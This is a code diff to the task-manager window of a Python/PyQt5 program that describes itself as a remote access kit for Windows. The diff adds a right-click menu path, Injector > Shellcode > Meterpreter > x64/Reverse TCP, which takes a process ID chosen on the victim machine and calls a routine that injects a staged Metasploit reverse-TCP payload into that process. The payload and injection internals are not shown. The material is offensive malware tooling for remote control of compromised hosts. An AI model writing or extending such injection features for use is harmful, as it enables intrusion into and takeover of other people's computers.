@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.1
+# Build:  1.0.2
 # -------------------------------------------------------------
 from PyQt5 import QtCore, QtGui, QtWidgets
 from PyQt5.Qt import Qt
@@ -18,10 +18,13 @@ from PyQt5.QtWidgets import QWidget,QMenu
 from PyQt5.QtCore import QEvent
 
 from ..utils.file_paths import DSFilePath,BGPath
-from ..logging.logging import LoggingUtilitys
+from ..logging.logging import LoggingUtilitys,ConsoleWindow
 from ..Qt5.icons import IconObj
+
 from ..client_handling.enumeration import SystemCommands
 from ..client_handling.system import SystemManager
+from ..client_handling.shell import Meterpreter
+from ..client_handling.meterpreter_payloads import MSFPayload
 
 import os
 
@@ -66,7 +69,7 @@ class Ui_task_manager_dialog(QWidget):
                         item = 'N/A'           #Set CPU resource to N/A,else it's a valid cpu measurement and can be posted
                 data_cell = QtWidgets.QTableWidgetItem(item.replace('"','').replace("'",'')) #Populate item object with data
                 data_cell.setTextAlignment(Qt.AlignLeft)                                     #Set text alignment
-                data_cell.setFlags(Qt.ItemIsEnabled)                                         #Make sure item can't be edited
+                data_cell.setFlags(Qt.ItemIsEnabled | Qt.ItemIsSelectable)                   #Make sure item can't be edited but can be selected
                 data_cell.setBackground(Qt.transparent)                                      #Set background to transparent
                 self.task_table_widget.setItem(row_count,column_count,data_cell)             #Add item to the table widget
                 column_count += 1                                                            #Increase column count
@@ -74,19 +77,51 @@ class Ui_task_manager_dialog(QWidget):
 
     def eventFilter(self, source, event):
         if event.type() == QEvent.ContextMenu and source is self.task_table_widget:
+            """
+            Create Menu Object
+            """
             context_menu = QMenu(self)  # Create Menu Object
-            refresh_tasks = context_menu.addAction('Refresh')                 #Add refresh action
-            kill_process = context_menu.addAction('Kill Process')             #Add Kill Process action
-            refresh_tasks.setIcon(IconObj().sync_icon)                        #Icon
-            kill_process.setIcon(IconObj().kill_task_icon)                    #Icon
-
+            """
+            Add submenus the main menu/other menus
+            """
+            injector_menu = context_menu.addMenu('Injector')
+            shellcode_menu = injector_menu.addMenu('Shellcode')
+            meterpreter_menu = shellcode_menu.addMenu('Meterpreter')
+            """
+            Add actions to to the menu/sub menus
+            """
+            refresh_tasks = context_menu.addAction('Refresh Tasks')
+            kill_process = context_menu.addAction('Kill Process')
+            x64_reverse_tcp = meterpreter_menu.addAction('x64/Reverse TCP')
+            """
+            Set the icons for each action on the context menu
+            """
+            refresh_tasks.setIcon(IconObj().sync_icon)
+            kill_process.setIcon(IconObj().kill_task_icon)
+            injector_menu.setIcon(IconObj().injector_icon)
+            meterpreter_menu.setIcon(IconObj().msf_icon)
+            shellcode_menu.setIcon(IconObj().shellcode_icon)
+            """
+            Define the action of clicking on the menu/make the menu appear where the cursor was clicked
+            """
             action = context_menu.exec_(self.mapToGlobal(event.globalPos()))  # Define the click action bool for the menu
-
+            """
+            Assign functions to the menu items when they are clicked 
+            """
             if action == refresh_tasks:                                       #If the action is to refresh the tasks
                 self.refresh_tasks()                                          #Refresh the window with current tasks
 
             if action == kill_process:                                        #If the action is to kill a process
                 self.kill_task()                                              #Kill the task
+
+            if action == x64_reverse_tcp:
+                ConsoleWindow().log_to_console(f'Generating meterpreter shellcode, please standby!')
+                process_pid = self.task_table_widget.item(self.task_table_widget.currentRow(),1).text()
+                Meterpreter().inject_msf_payload(
+                    MSFPayload().staged_x64_reverse_tcp,
+                    process_pid,
+                    self.encryption_key,
+                    self.client_socket_obj)
 
             return True
         return super().eventFilter(source, event)
@@ -100,6 +135,7 @@ class Ui_task_manager_dialog(QWidget):
         self.task_table_widget = QtWidgets.QTableWidget(task_manager_dialog)
         self.task_table_widget.setGeometry(QtCore.QRect(20, 30, 491, 581))
         self.task_table_widget.setStyleSheet(f"background-image: url({BGPath().task_man_bg});")
+        self.task_table_widget.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectionBehavior.SelectRows)
         self.task_table_widget.installEventFilter(self)
         self.task_table_widget.setObjectName("task_table_widget")
         self.task_table_widget.setColumnCount(3)
